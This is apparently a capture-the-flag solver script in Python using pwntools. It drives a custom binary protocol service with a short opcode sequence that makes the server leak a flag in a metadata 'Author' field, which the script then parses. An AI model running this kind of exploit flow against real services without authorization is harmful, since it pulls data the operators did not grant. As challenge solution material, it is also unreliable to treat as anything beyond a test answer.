@@ -1,0 +1,112 @@
+from __future__ import annotations
+
+from pwn import remote  # type: ignore
+import os
+import re
+from typing import Dict, Tuple, Optional, List
+
+
+# Protocol helpers -----------------------------------------------------------
+
+def send_cmd(io, data: bytes) -> None:
+    io.send(data)
+
+
+def read_exact(io, n: int, timeout: float = 2.0) -> bytes:
+    data = b""
+    while len(data) < n:
+        chunk = io.recv(n - len(data), timeout=timeout)
+        if not chunk:
+            break
+        data += chunk
+    return data
+
+
+def read_chunk(io, timeout: float = 2.0) -> Optional[Tuple[int, bytes]]:
+    """Read one server chunk: 1-byte tag + 2-byte little-endian length + payload."""
+    hdr = read_exact(io, 3, timeout=timeout)
+    if len(hdr) < 3:
+        return None
+    tag = hdr[0]
+    length = hdr[1] | (hdr[2] << 8)
+    payload = read_exact(io, length, timeout=timeout)
+    if len(payload) < length:
+        return None
+    return tag, payload
+
+
+# Response parsing -----------------------------------------------------------
+
+PRINTABLE_RE = re.compile(rb"[ -~]{1,256}")
+
+
+def tokenize_printables(data: bytes) -> List[bytes]:
+    return [m.group(0) for m in PRINTABLE_RE.finditer(data)]
+
+
+def parse_kv_payload(payload: bytes) -> Dict[str, str]:
+    """Best-effort parse of a key/value bundle produced by opcode 0x32.
+
+    The server serializes a small structure with fields like "Author", "Comment",
+    and "Software" using an internal container format. We conservatively scan the
+    payload for printable tokens and map well-known keys to the token that follows.
+    """
+    tokens = tokenize_printables(payload)
+    keys = {b"Author", b"Comment", b"Software"}
+    out: Dict[str, str] = {}
+    for i, tok in enumerate(tokens):
+        if tok in keys and i + 1 < len(tokens):
+            # Prefer the very next printable token as the value
+            key = tok.decode("ascii", errors="ignore")
+            val = tokens[i + 1].decode("utf-8", errors="ignore")
+            # Guard against obviously invalid huge values
+            if len(val) > 0:
+                out[key] = val
+    return out
+
+
+# Exploit flow ---------------------------------------------------------------
+
+def exploit_fetch_metadata(io) -> Tuple[Optional[Dict[str, str]], bytes]:
+    # 0x10: enable session; 0x22: build default entry with flag in Author; 0x32 x01: request bundle
+    send_cmd(io, b"\x10")
+    io.recv(timeout=0.1)  # ignore 1-byte ack if present
+    send_cmd(io, b"\x22")
+    io.recv(timeout=0.1)
+    send_cmd(io, b"\x32\x01")
+
+    chunk = read_chunk(io, timeout=2.0)
+    if not chunk:
+        return None, b""
+    tag, payload = chunk
+    parsed = parse_kv_payload(payload)
+    return parsed, payload
+
+
+def main():
+    host = os.environ.get("HOST", "127.0.0.1")
+    port = int(os.environ.get("PORT", "4265"))
+    io = remote(host, port)
+    try:
+        kv, raw = exploit_fetch_metadata(io)
+        if kv:
+            print("Parsed fields:")
+            for k in ("Author", "Comment", "Software"):
+                if k in kv:
+                    print(f"- {k}: {kv[k]}")
+            if "Author" in kv:
+                print(f"\nAuthor (likely flag): {kv['Author']}")
+        else:
+            print(f"No parsable KV bundle. Raw chunk ({len(raw)} bytes): {raw.hex()}")
+    finally:
+        try:
+            send_cmd(io, b"\x11")  # close session politely
+        except Exception:
+            pass
+        io.close()
+
+
+if __name__ == "__main__":
+    main()
+
+
